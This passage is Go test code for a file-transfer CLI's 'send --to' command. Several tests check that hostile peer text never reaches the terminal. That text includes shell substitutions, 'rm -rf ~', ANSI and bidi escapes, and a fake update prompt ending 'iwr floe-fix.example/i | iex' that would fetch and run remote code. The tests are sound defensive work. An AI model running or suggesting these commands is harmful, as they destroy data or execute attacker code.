			herr := h.wait(t)
			r.read(o)
			if herr != nil {
				t.Fatalf("host: %v", herr)
			}
			wantOutcome(t, r, c.lines...)
			wantInOrder(t, r.stdout, tlWaiting)
			if strings.Contains(r.stdout, tlNothingSave) {
				t.Fatalf("stdout still claims nothing is saved before an accept (D-177):\n%s", r.stdout)
			}
		})
	}
}

// TestSendToDeclinedExitsNonZero: the engine's own Decline on a real host
// ends the command on TL-14 with a non-zero exit, and nothing was written.
func TestSendToDeclinedExitsNonZero(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	stubNetwork(t, s.URL)
	p, _ := oneFile(t, t.TempDir(), "a.bin", 4096)
	out := t.TempDir()
	h := startHost(t, s, func(h *testHost) error {
		if err := h.offer(); err != nil {
			return err
		}
		err := h.receive(out, func(transfer.IncomingInfo) transfer.Decision {
			return transfer.Decision{Kind: transfer.DecisionDecline}
		}, nil)
		if !errors.Is(err, transfer.ErrDeclined) {
			return fmt.Errorf("host receive = %v, want ErrDeclined", err)
		}
		return nil
	})
	r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
	herr := h.wait(t)
	r.read(o)
	if herr != nil {
		t.Fatalf("host: %v", herr)
	}
	wantOutcome(t, r, "They declined. Nothing was sent.")
	if left, _ := os.ReadDir(out); len(left) != 0 {
		t.Fatalf("the host wrote %d entries after a decline", len(left))
	}
}

// TestSendToDeepFolderRefusedByHostLimits: a folder whose file sits one level
// past the universal depth limit (33 components, as
// TestUniversalDepth33RefusesPathTooLongBeforeMkdir), with short names so
// PrecheckDrop passes, and a host with no request-link limits: the host's
// universal limits refuse path-too-long before anything exists, and the
// command prints TL-20's saved-0 block (D-033).
func TestSendToDeepFolderRefusedByHostLimits(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	stubNetwork(t, s.URL)
	root := filepath.Join(t.TempDir(), "d")
	oneFile(t, root, filepath.Join(strings.Repeat("d"+string(filepath.Separator), 31), "f.txt"), 8)
	out := t.TempDir()
	var mu sync.Mutex
	var doneFiles []transfer.FileDone
	h := startHost(t, s, deliveringHost(out, &doneFiles, &mu))
	r := runCLI(t, root, "--to", linkFor(), "--server", s.URL)
	herr := h.wait(t)
	r.read(o)
	wantOutcome(t, r, "A folder path is too long for their computer. Zip deeply nested folders first.", "Nothing was sent.")
	var refused *transfer.RefusedError
	if !errors.As(herr, &refused) || refused.Code != transfer.CodePathTooLong {
		t.Fatalf("host = %v, want its path-too-long refusal", herr)
	}
	if left, _ := os.ReadDir(out); len(left) != 0 {
		t.Fatalf("the host created %d entries before refusing", len(left))
	}
}

// TestSendToTreeEmptiedBeforeTheSendKeepsTheWalksError: a folder emptied
// after the precheck, before the send's own walk, ends on the walk's error as
// an empty folder at the first walk does ("Error: no files to send"), not on
// "Connection lost. Nothing was sent." (review lens A, nit 7). The host holds
// its offer until the test has emptied the folder.
func TestSendToTreeEmptiedBeforeTheSendKeepsTheWalksError(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	stubNetwork(t, s.URL)
	folder := filepath.Join(t.TempDir(), "shoot")
	file, _ := oneFile(t, folder, "a.bin", 16)
	emptied := make(chan struct{})
	h := startHost(t, s, func(h *testHost) error {
		select {
		case <-emptied:
		case <-h.quit:
			return errors.New("the folder was never emptied")
		}
		if err := h.offer(); err != nil {
			return err
		}
		h.holdOpen()
		return nil
	})
	r := startCLI(t, folder, "--to", linkFor(), "--server", s.URL)
	select {
	case <-s.seated:
	case <-time.After(20 * time.Second):
		t.Fatal("the visitor was never seated")
	}
	if err := os.Remove(file); err != nil {
		t.Fatal(err)
	}
	close(emptied)
	r.wait(t, 30*time.Second)
	if herr := h.wait(t); herr != nil {
		t.Fatalf("host: %v", herr)
	}
	r.read(o)
	if !errors.Is(r.err, transfer.ErrNoFiles) || !strings.Contains(r.stderr, "Error: no files to send") {
		t.Fatalf("the command returned %v, want the walk's own error\nstderr:\n%s", r.err, r.stderr)
	}
	if strings.Contains(r.stderr, "Connection lost") {
		t.Fatalf("an emptied folder blamed the connection:\n%s", r.stderr)
	}
}

// TestSendToRelayOverCapEndsBeforeWait: a relayed drop over the 2 GB cap ends
// right after the Connected line, before WAIT, on today's sentence through
// cobra (TL-11), and the host's first frame is the gate's own abort, text
// with the gate's words, never a metadata. A loopback pairing never selects a
// relay, so the gate is stood in through relayGateFor.
func TestSendToRelayOverCapEndsBeforeWait(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	stubNetwork(t, s.URL)
	prev := relayGateFor
	t.Cleanup(func() { relayGateFor = prev })
	blocked := fmt.Errorf("transfer blocked: %w (selected 3 GB)", transfer.ErrRelayOverLimit)
	relayGateFor = func(*webrtc.DataChannel, int64) error { return blocked }
	p, _ := oneFile(t, t.TempDir(), "a.bin", 4096)
	var first webrtc.DataChannelMessage
	h := startHost(t, s, func(h *testHost) error {
		if err := h.offer(); err != nil {
			return err
		}
		m, err := h.frame(20 * time.Second)
		if err != nil {
			return err
		}
		first = m
		h.holdOpen()
		return nil
	})
	r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
	herr := h.wait(t)
	r.read(o)
	if herr != nil {
		t.Fatalf("host: %v", herr)
	}
	if !errors.Is(r.err, transfer.ErrRelayOverLimit) {
		t.Fatalf("the command returned %v, want the relay gate's error", r.err)
	}
	if !strings.Contains(r.stderr, "Error: transfer blocked: relay connections are capped at 2 GB (selected 3 GB)\n") {
		t.Fatalf("stderr lacks TL-11's sentence:\n%s", r.stderr)
	}
	wantInOrder(t, r.stdout, tlJoining, tlConnecting)
	if !strings.Contains(r.stdout, "  Connected") {
		t.Fatalf("stdout lacks the Connected line:\n%s", r.stdout)
	}
	if strings.Contains(r.stdout, tlWaiting) || strings.Contains(r.stdout, tlNothingSave) {
		t.Fatalf("WAIT printed for a drop the relay gate refused:\n%s", r.stdout)
	}
	var f struct {
		Type   string `json:"type"`
		Reason string `json:"reason"`
	}
	if !first.IsString || json.Unmarshal(first.Data, &f) != nil || f.Type != "incompatible" || f.Reason != blocked.Error() {
		t.Fatalf("the host's first frame was %q (text %v); want the gate's text abort", first.Data, first.IsString)
	}
}

// TestSendToHostileReasonNeverPrinted: a hostile host's reason (a shell
// substitution, a bidi override, an ANSI clear, and 5,000 characters of it)
// never reaches stdout or stderr, in any frame shape it can come in: an
// unknown code, a known code, no code, a version range miss either way, and
// over the control cap; nor after the last file, in the wait for received.
func TestSendToHostileReasonNeverPrinted(t *testing.T) {
	const marker = "zqx-hostile-reason"
	hostile := marker + " $(calc) ‮\x1b[2J `whoami` ;rm -rf ~"
	enc := func(s string) string {
		b, _ := json.Marshal(s)
		return string(b)
	}
	short := enc(hostile)
	long := enc(strings.Repeat(hostile+" ", 5000/len(hostile)+1))
	if len(long) < 5000 {
		t.Fatalf("the long reason is %d bytes", len(long))
	}
	atEnd := func(frame string) func(*testHost) error {
		return func(h *testHost) error {
			if err := h.offer(); err != nil {
				return err
			}
			id, err := h.awaitMetadata()
			if err != nil {
				return err
			}
			if err := h.ack(id); err != nil {
				return err
			}
			if err := h.awaitEnd(); err != nil {
				return err
			}
			if err := h.dc.Send([]byte(frame)); err != nil {
				return err
			}
			h.holdOpen()
			return nil
		}
	}
	// Over the cap the frame is never read, so the host then closes, as a
	// receiver that gave up does.
	overCap := func(frame string) func(*testHost) error {
		return func(h *testHost) error {
			if err := h.offer(); err != nil {
				return err
			}
			if _, err := h.awaitMetadata(); err != nil {
				return err
			}
			if err := h.dc.Send([]byte(frame)); err != nil {
				return err
			}
			time.Sleep(300 * time.Millisecond)
			h.conn.Close()
			return nil
		}
	}
	// A first ack that carries fields, as a hostile host would send it.
	ackWith := func(fields string) func(*testHost) error {
		return func(h *testHost) error {
			if err := h.offer(); err != nil {
				return err
			}
			id, err := h.awaitMetadata()
			if err != nil {
				return err
			}
			if err := h.dc.Send([]byte(`{"type":"ack","id":"` + id + `","offset":0,` + fields + `}`)); err != nil {
				return err
			}
			h.holdOpen()
			return nil
		}
	}
	thisBehind := []string{"Your Floe needs an update to send to this link.", "Run `floe update` to upgrade."}
	cases := []struct {
		name  string
		part  func(*testHost) error
		lines []string
	}{
		{"unknown code", refuseAtMetadata(`{"type":"incompatible","reason":` + short + `,"pv":1,"pvMin":1,"code":"too-slow","saved":0}`),
			[]string{"The drop stopped on their computer.", "Nothing was sent."}},
		{"known code", refuseAtMetadata(`{"type":"incompatible","reason":` + short + `,"pv":1,"pvMin":1,"code":"write-failed","saved":0}`),
			[]string{"Their computer could not save a file.", "Nothing was sent."}},
		{"no code", refuseAtMetadata(`{"type":"incompatible","reason":` + short + `,"pv":1,"pvMin":1}`),
			[]string{"The drop stopped on their computer.", "Nothing was sent."}},
		{"range miss, host behind", refuseAtMetadata(`{"type":"incompatible","reason":` + short + `,"pv":-1,"pvMin":-1}`),
			[]string{"Their Floe needs an update to receive from this link."}},
		// A host reaches this side's own version miss with any pv it likes
		// (review lens B, L1): its ver and range stay off the terminal too.
		{"range miss, this CLI behind", refuseAtMetadata(`{"type":"incompatible","reason":` + short + `,"pv":9,"pvMin":9,"ver":` + short + `}`), thisBehind},
		{"range miss at the first ack, this CLI behind", ackWith(`"pv":9,"pvMin":9,"ver":` + short), thisBehind},
		{"5,000 characters, over the cap", overCap(`{"type":"incompatible","reason":` + long + `,"pv":1,"pvMin":1,"code":"too-slow"}`),
			[]string{"Connection lost. Nothing was sent."}},
		{"unknown code after the last end", atEnd(`{"type":"incompatible","reason":` + short + `,"pv":1,"pvMin":1,"code":"too-slow","saved":0}`),
			[]string{"The drop stopped on their computer.", "Nothing was sent."}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			o := captureOutput(t)
			s := newReqServer(t, "seat")
			stubNetwork(t, s.URL)
			p, _ := oneFile(t, t.TempDir(), "a.bin", 4096)
			h := startHost(t, s, c.part)
			r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
			herr := h.wait(t)
			r.read(o)
			if herr != nil {
				t.Fatalf("host: %v", herr)
			}
			wantOutcome(t, r, c.lines...)
			both := r.stdout + r.stderr
			for _, bad := range []string{marker, "$(calc)", "‮", "\x1b", "whoami", "rm -rf", "protocol 9"} {
				if strings.Contains(both, bad) {
					t.Fatalf("%q reached the terminal:\nstdout:\n%s\nstderr:\n%s", bad, r.stdout, r.stderr)
				}
			}
		})
	}
}

// verHost is a host that acks the visitor's one file with ver as its own
// version and then reports it received and matched.
func verHost(ver string) func(*testHost) error {
	return func(h *testHost) error {
		if err := h.offer(); err != nil {
			return err
		}
		id, err := h.awaitMetadata()
		if err != nil {
			return err
		}
		v, _ := json.Marshal(ver)
		if err := h.dc.Send([]byte(`{"type":"ack","id":"` + id + `","offset":0,"pv":1,"pvMin":1,"ver":` + string(v) + `}`)); err != nil {
			return err
		}
		if err := h.awaitEnd(); err != nil {
			return err
		}
		if err := h.dc.Send([]byte(`{"type":"received","verified":1}`)); err != nil {
			return err
		}
		h.holdOpen()
		return nil
	}
}

// TestSendToPeerVersionOnlyWhenReleaseShaped (D-147 (2), review lens B
// re-check N3): the host's version prints on TL-02's "Peer version:" line
// only when it is release-shaped, so an honest host's line is TL-02's byte
// for byte, and a host that puts its own words in that field gets no line at
// all, while its drop still arrives.
func TestSendToPeerVersionOnlyWhenReleaseShaped(t *testing.T) {
	// This build's own version must differ from every host's below, or the
	// line is left out for being the same version.
	prev := version
	version = "1.10.11"
	t.Cleanup(func() { version = prev })
	words64 := (`Your Floe is out of date. Visit floe-fix.example to keep sending` + strings.Repeat("!", 64))[:64]
	if n := len([]rune(words64)); n != 64 {
		t.Fatalf("the 64-rune version is %d runes", n)
	}
	for _, c := range []struct {
		name, ver, line string
	}{
		{"an honest Floe Desktop host (TL-02)", "desktop-v0.3.0", "  Peer version: desktop-v0.3.0\n"},
		{"a CLI release", "1.10.12", "  Peer version: 1.10.12\n"},
		{"a prerelease suffix (D-148)", "v1.11.0-rc.1", ""},
		{"dotted words in a suffix", "1.0.0-visit.floe-fix.example", ""},
		{"a dev build", "dev", "  Peer version: dev\n"},
		{"words", "visit evil.example to update", ""},
		{"a URL", "https://evil.example/update", ""},
		{"64 runes of words", words64, ""},
	} {
		t.Run(c.name, func(t *testing.T) {
			o := captureOutput(t)
			s := newReqServer(t, "seat")
			stubNetwork(t, s.URL)
			p, _ := oneFile(t, t.TempDir(), "a.bin", 4096)
			h := startHost(t, s, verHost(c.ver))
			r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
			herr := h.wait(t)
			r.read(o)
			if r.err != nil || herr != nil {
				t.Fatalf("the drop failed: cli %v, host %v\nstdout:\n%s\nstderr:\n%s", r.err, herr, r.stdout, r.stderr)
			}
			if !strings.Contains(r.stdout, "\n  1 file arrived (") {
				t.Fatalf("the drop did not arrive:\n%s", r.stdout)
			}
			both := r.stdout + r.stderr
			n := strings.Count(both, "Peer version")
			if c.line == "" {
				if n != 0 || strings.Contains(both, "evil.example") || strings.Contains(both, "floe-fix.example") {
					t.Fatalf("a host's own words reached the terminal:\nstdout:\n%s\nstderr:\n%s", r.stdout, r.stderr)
				}
				return
			}
			if n != 1 || !strings.Contains(r.stdout, "\n"+c.line) {
				t.Fatalf("want the line %q once on stdout:\n%s\nstderr:\n%s", c.line, r.stdout, r.stderr)
			}
		})
	}
}

// TestSendToHostileOfferNeverPrinted (08 11.3 S8, the SDP half, on the --to
// surface; review lens B re-check N4): a host whose offer SDP carries an ANSI
// clear, an OSC 8 link, bidi controls, backspaces and a shell substitution,
// in its origin and session lines or in a broken media line, ends the
// command on TL-10, and no byte of it reaches stdout or stderr, pion's own
// lines included. A change that prints the setup error's text on this path
// fails here.
func TestSendToHostileOfferNeverPrinted(t *testing.T) {
	const marker = "zqx-hostile-sdp"
	hostile := marker + " \x1b[2J\x1b]8;;http://evil.example/\x07CLICK\x1b]8;;\x07\xe2\x80\xae\xe2\x81\xa6\b\b $(calc)"
	for _, c := range []struct{ name, sdp string }{
		{"in the origin and session lines", "v=0\r\no=- 1 1 IN IP4 " + hostile + "\r\ns=" + hostile + "\r\n"},
		{"in a broken media line", "v=0\r\no=- 1 1 IN IP4 127.0.0.1\r\ns=-\r\nt=0 0\r\nm=" + hostile + "\r\n"},
	} {
		t.Run(c.name, func(t *testing.T) {
			o := captureOutput(t)
			s := newReqServer(t, "seat")
			stubNetwork(t, s.URL)
			p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
			cliDone := make(chan struct{})
			h := startHost(t, s, func(h *testHost) error {
				if err := h.sc.SendSignal(map[string]interface{}{"type": "offer", "sdp": c.sdp}); err != nil {
					return err
				}
				// Seated until the command has ended, so the end is the
				// offer's and not the host's leaving.
				select {
				case <-cliDone:
				case <-h.quit:
				case <-time.After(20 * time.Second):
				}
				return nil
			})
			r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
			close(cliDone)
			if err := h.wait(t); err != nil {
				t.Fatalf("host: %v", err)
			}
			r.read(o)
			wantOutcome(t, r, tlSetupFailed)
			for _, bad := range []string{marker, "\x1b[2J", "\x1b]8;;", "\x07", "\xe2\x80\xae", "\xe2\x81\xa6", "\b", "$(calc)", "evil.example", "CLICK"} {
				if strings.Contains(r.stdout, bad) || strings.Contains(r.stderr, bad) {
					t.Fatalf("%q reached the terminal:\nstdout:\n%q\nstderr:\n%q", bad, r.stdout, r.stderr)
				}
			}
		})
	}
}

// TestSendToHostUfragWordsNeverReachTheTerminal (FU-46, FU-32 F2-2): a host
// that trickles, after its offer, a candidate whose ufrag matches nothing in
// that offer made pion log "pc ERROR: dropping candidate with ufrag <ufrag>"
// on the visitor's stderr. FU-40's escape turns controls into visible escapes
// but passes the rest of Latin-1, so words joined with no-break spaces
// printed as the host's own readable sentence, on the path where D-147 (2)
// keeps every word a stranger host chooses off the terminal. The candidate
// goes through the signaling path a real host uses, to the peer runSendTo
// builds, so this fails if the --to path stops quieting pion's pc scope.
func TestSendToHostUfragWordsNeverReachTheTerminal(t *testing.T) {
	o := captureOutput(t)
	s := newReqServer(t, "seat")
	stubNetwork(t, s.URL)
	p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
	const said = "Your Floe needs an update to send to this link. Run: iwr floe-fix.example/i | iex"
	words := strings.ReplaceAll(said, " ", "\u00a0")
	h := startHost(t, s, func(h *testHost) error {
		// The channel is open once offer returns, so the visitor holds the
		// host's offer and pion checks the candidate's ufrag against it.
		if err := h.offer(); err != nil {
			return err
		}
		if err := h.sc.SendSignal(map[string]interface{}{"candidate": map[string]interface{}{
			"candidate": "candidate:1 1 udp 2130706431 192.0.2.1 5000 typ host ufrag " + words,
			"sdpMid":    "0",
		}}); err != nil {
			return err
		}
		if _, err := h.awaitMetadata(); err != nil {
			return err
		}
		// A beat for the visitor's pion to take the candidate, which came
		// over the signaling socket and not the channel, then decline.
		time.Sleep(500 * time.Millisecond)
		if err := h.dc.Send([]byte(`{"type":"incompatible","reason":"declined","pv":1,"pvMin":1,"ver":"desktop-test","code":"declined","saved":0}`)); err != nil {
			return err
		}
		h.holdOpen()
		return nil
	})
	r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
	herr := h.wait(t)
	r.read(o)
	if herr != nil {
		t.Fatalf("host: %v", herr)
	}
	both := strings.ReplaceAll(r.stdout+r.stderr, "\u00a0", " ")
	for _, bad := range []string{"floe-fix.example", "Your Floe needs an update to send", "dropping candidate"} {
		if strings.Contains(both, bad) {
			t.Fatalf("the host's words reached the terminal (%q):\nstdout:\n%s\nstderr:\n%s", bad, r.stdout, r.stderr)
		}
	}
	wantOutcome(t, r, "They declined. Nothing was sent.")
}

// ── The clocks ───────────────────────────────────────────────────────────────

// TestSendToAckTimeoutIsVisitorAckPlusGrace: the send waits for acks on the
// visitor's clock, the engine's pair (critic M-04), which reaches the engine
// through sendToOptions; the file names no literal for it; and a host that
// never answers ends the command on TL-15 once the (shrunk) clock runs out.
func TestSendToAckTimeoutIsVisitorAckPlusGrace(t *testing.T) {
	o := captureOutput(t)
	if sendToAckTimeout != transfer.VisitorAckTimeout+transfer.VisitorAckGrace {
		t.Fatalf("sendToAckTimeout = %v, want VisitorAckTimeout + VisitorAckGrace (%v)", sendToAckTimeout, transfer.VisitorAckTimeout+transfer.VisitorAckGrace)
	}
	msgs, closed := make(chan webrtc.DataChannelMessage), make(chan struct{})
	early := &peer.Early{Msgs: msgs, Closed: closed}
	stop := make(chan struct{})
	opts := sendToOptions(early, stop, nil, nil)
	if opts.AckTimeout != sendToAckTimeout || !opts.RequireReceived || !opts.NoSummary ||
		opts.Messages != early.Msgs || opts.Closed != early.Closed || opts.Stop != (<-chan struct{})(stop) || !opts.EndBarLine ||
		!opts.PeerVersionReleaseOnly {
		t.Fatalf("sendToOptions = %+v; want the visitor's clock, RequireReceived, NoSummary, Ctrl+C's stop, EndBarLine, PeerVersionReleaseOnly and the connection's pump", opts)
	}
	src, err := os.ReadFile("sendto.go")
	if err != nil {
		t.Fatal(err)
	}
	if lit := regexp.MustCompile(`10 \* time\.Minute|600 \* time\.Second`); lit.Match(src) {
		t.Fatalf("sendto.go restates the ack clock as a literal: %q", lit.Find(src))
	}

	prev := sendToAckTimeout
	sendToAckTimeout = 1500 * time.Millisecond
	t.Cleanup(func() { sendToAckTimeout = prev })
	if got := sendToOptions(early, nil, nil, nil).AckTimeout; got != sendToAckTimeout {
		t.Fatalf("sendToOptions reads %v, not the var (%v)", got, sendToAckTimeout)
	}
	s := newReqServer(t, "seat")
	stubNetwork(t, s.URL)
	p, _ := oneFile(t, t.TempDir(), "a.bin", 16)
	h := startHost(t, s, func(h *testHost) error {
		if err := h.offer(); err != nil {
			return err
		}
		h.holdOpen()
		return nil
	})
	r := runCLI(t, p, "--to", linkFor(), "--server", s.URL)
	herr := h.wait(t)
	r.read(o)
	if herr != nil {
		t.Fatalf("host: %v", herr)
	}
	wantOutcome(t, r, "They did not answer in time. Nothing was sent.")
}

// TestSendToWaitLineIsTheApprovedCopy: WAIT reads exactly as D-144 (6)
// amended it; it is derived from the host's window, so this is the pin.
func TestSendToWaitLineIsTheApprovedCopy(t *testing.T) {
	if lineWaiting != tlWaiting {
		t.Fatalf("WAIT reads %q, want %q", lineWaiting, tlWaiting)
	}
}

// ── Outcome mapping and Ctrl+C ───────────────────────────────────────────────

// TestSendToOutcomeLines pins the mapping the command ends with, by errors.As
// and errors.Is only, for the shapes the wire tests above cannot reach
// cheaply: the saved forms (TL-16 to TL-26, "4 of 12"), the lost line
// (TL-27, its "rest" and singular forms), TL-13, TL-15 and today's sentences.
func TestSendToOutcomeLines(t *testing.T) {
	type want struct {
		lines []string
		keep  bool
	}
	wrapped := func(err error) error { return fmt.Errorf("error sending shoot/a.mov: %w", err) }
	relay := fmt.Errorf("transfer blocked: %w (selected 3 GB)", transfer.ErrRelayOverLimit)
	cases := []struct {
		name         string
		err          error
		files, acked int
		want         want
	}{
		{"disk-full, 4 of 12", &transfer.PeerStoppedError{Code: transfer.CodeDiskFull, Saved: 4}, 12, 5,
			want{lines: []string{"Their computer ran out of space.", "4 of 12 files were saved."}}},
		{"hash-mismatch, 4 of 12", &transfer.PeerStoppedError{Code: transfer.CodeHashMismatch, Saved: 4}, 12, 5,
			want{lines: []string{"A file changed or was damaged on the way, so their Floe deleted it.", "4 of 12 files were saved.", "Ask them for a new link to send the rest."}}},
		{"relay-cap, 4 of 12", &transfer.PeerStoppedError{Code: transfer.CodeRelayCap, Saved: 4}, 12, 5,
			want{lines: []string{"Relayed drops are capped at 2 GB.", "4 of 12 files were saved."}}},
		{"stopped, 1 of 1", &transfer.PeerStoppedError{Code: transfer.CodeStopped, Saved: 1}, 1, 1,
			want{lines: []string{"They stopped this drop.", "1 of 1 file was saved."}}},
		{"a saved count over the drop is clamped", &transfer.PeerStoppedError{Code: transfer.CodeTimeLimit, Saved: 99}, 12, 12,
			want{lines: []string{"This drop reached the 24-hour limit, so their Floe stopped it.", "12 of 12 files were saved."}}},
		{"a code outside the allowlist", &transfer.PeerStoppedError{Code: "too-slow", Saved: 4}, 12, 5,
			want{lines: []string{"The drop stopped on their computer.", "4 of 12 files were saved."}}},
		{"no known code, 4 of 12", &transfer.PeerEndedError{Saved: 4}, 12, 5,
			want{lines: []string{"The drop stopped on their computer.", "4 of 12 files were saved."}}},
		{"range miss, host behind", &transfer.CompatError{LocalTooOld: false}, 12, 0,
			want{lines: []string{"Their Floe needs an update to receive from this link."}}},
		{"range miss at the first ack, host behind", wrapped(&transfer.CompatError{LocalTooOld: false}), 12, 1,
			want{lines: []string{"Their Floe needs an update to receive from this link."}}},
		{"range miss, this CLI behind", &transfer.CompatError{LocalTooOld: true}, 12, 0,
			want{lines: []string{"Your Floe needs an update to send to this link.", "Run `floe update` to upgrade."}}},
		{"range miss at the first ack, this CLI behind", wrapped(&transfer.CompatError{LocalTooOld: true}), 12, 1,
			want{lines: []string{"Your Floe needs an update to send to this link.", "Run `floe update` to upgrade."}}},
		{"relay gate (TL-11)", relay, 12, 0, want{keep: true}},
		{"a file changed while read", wrapped(fmt.Errorf("the file grew while it was being sent (announced 4 bytes); %w", transfer.ErrFileChanged)), 12, 3, want{keep: true}},
		{"a file gone", wrapped(&fs.PathError{Op: "open", Path: "shoot/a.mov", Err: fs.ErrNotExist}), 12, 3, want{keep: true}},
		{"the tree emptied between the walks", transfer.ErrNoFiles, 12, 0, want{keep: true}},
		{"ack timeout before accept (TL-15)", wrapped(transfer.ErrAckTimeout), 12, 0,
			want{lines: []string{"They did not answer in time. Nothing was sent."}}},
		{"ack timeout after accept", wrapped(transfer.ErrAckTimeout), 12, 5,
			want{lines: []string{"Connection lost. 4 of 12 files arrived. Ask them for a new link to send the other 8."}}},
		{"closed before accept", wrapped(errors.New("connection closed while waiting for the receiver")), 12, 0,
			want{lines: []string{"Connection lost. Nothing was sent."}}},
		{"closed mid-drop (TL-27)", wrapped(errors.New("connection closed mid-transfer (3 bytes still buffered)")), 12, 5,
			want{lines: []string{"Connection lost. 4 of 12 files arrived. Ask them for a new link to send the other 8."}}},
		{"closed before received", transfer.ErrClosedBeforeReceived, 12, 12,
			want{lines: []string{"Connection lost. 11 of 12 files arrived. Ask them for a new link to send the other 1."}}},
		{"closed, one file", transfer.ErrClosedBeforeReceived, 1, 1,
			want{lines: []string{"Connection lost. 0 of 1 file arrived. Ask them for a new link to send it."}}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			lines, keep := sendToOutcome(c.err, c.files, c.acked)
			if c.want.keep {
				if keep != c.err || lines != nil {
					t.Fatalf("got (%q, %v), want the error kept for cobra", lines, keep)
				}
				return
			}
			if keep != nil || strings.Join(lines, "\n") != strings.Join(c.want.lines, "\n") {
				t.Fatalf("got (%q, %v), want %q", lines, keep, c.want.lines)
			}
		})
	}
	if got := lostLine(12, 12); got != "Connection lost. 12 of 12 files arrived. Ask them for a new link to send the rest." {
		t.Fatalf("lostLine with none left = %q", got)
	}
}

// TestSendToLocalTooOldKeepsTodaysRemedy: the fixed remedy for this side's
// version miss is the engine's own last line for it, so the two cannot drift.
func TestSendToLocalTooOldKeepsTodaysRemedy(t *testing.T) {
	msg := transfer.CompatErrorMessage(true, "v1", "v9", 1, 1, 9, 9)
	if !strings.HasSuffix(msg, "\n  "+lineRunUpdate) {
		t.Fatalf("the engine's remedy for this side's version miss is no longer %q:\n%s", lineRunUpdate, msg)
	}
}

// TestRunSendToWatchesTheConnection pins the Failed watcher's place in
// runSendTo as TestRunSendWatchesTheConnection pins it in runSend: a
// closeOnFailed call before the SendFilesWithOptions call, its quit closed by
// a defer, so the wait for the host's received has its bound and the watch
// ends with the command.
func TestRunSendToWatchesTheConnection(t *testing.T) {
	watchAt, sendAt, quitDeferred := watcherShape(t, "sendto.go", "runSendTo", "closeOnFailed", "SendFilesWithOptions")
	switch {
	case !watchAt.IsValid():
		t.Fatal("runSendTo never calls closeOnFailed: an ICE failure would leave the wait for the host's received open")
	case !sendAt.IsValid():
		t.Fatal("runSendTo no longer calls SendFilesWithOptions; re-anchor this test")
	case watchAt > sendAt:
		t.Fatal("runSendTo calls closeOnFailed after SendFilesWithOptions, when the wait it bounds is already over")
	case !quitDeferred:
		t.Fatal("closeOnFailed's quit is not closed by a defer in runSendTo, so the watch could outlive the command")
	}
}

// TestSendToHelpLine: --to is on send only, with the approved help line
// (TL-34), and on no other command.
func TestSendToHelpLine(t *testing.T) {
	f := sendCmd.Flags().Lookup("to")
	if f == nil || f.Usage != "send through a request link made in Floe Desktop instead of creating a code" || f.DefValue != "" {
		t.Fatalf("--to = %+v", f)
	}
	for _, c := range rootCmd.Commands() {
		if c != sendCmd && c.Flags().Lookup("to") != nil {
			t.Fatalf("%s has a --to flag", c.Name())
		}
	}
}
